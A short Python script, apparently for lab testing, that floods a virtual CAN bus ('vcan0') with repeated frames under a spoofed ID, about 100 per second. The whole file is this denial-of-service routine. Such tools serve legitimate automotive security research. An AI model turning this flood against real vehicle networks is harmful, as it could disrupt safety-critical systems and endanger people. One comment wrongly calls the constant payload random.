#!/usr/bin/env python3
"""
CAN Bus Injector Script  
Author: Frank Otieno  
Contact: frankotieno254@gmail.com

Simulates a flooding attack by sending rapid CAN frames with spoofed IDs.
"""

import can
import time

def main():
    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

    print("[+] Starting CAN flood injection... Press Ctrl+C to stop.")
    try:
        while True:
            # Spoofed ID and random data
            msg = can.Message(arbitration_id=0x500, data=[0xFF]*8, is_extended_id=False)
            bus.send(msg)
            print(f"Sent: ID={hex(msg.arbitration_id)} Data={msg.data.hex()}")
            time.sleep(0.01)  # 100 messages per second
    except KeyboardInterrupt:
        print("\n[+] Injection stopped by user.")

if __name__ == "__main__":
    main()
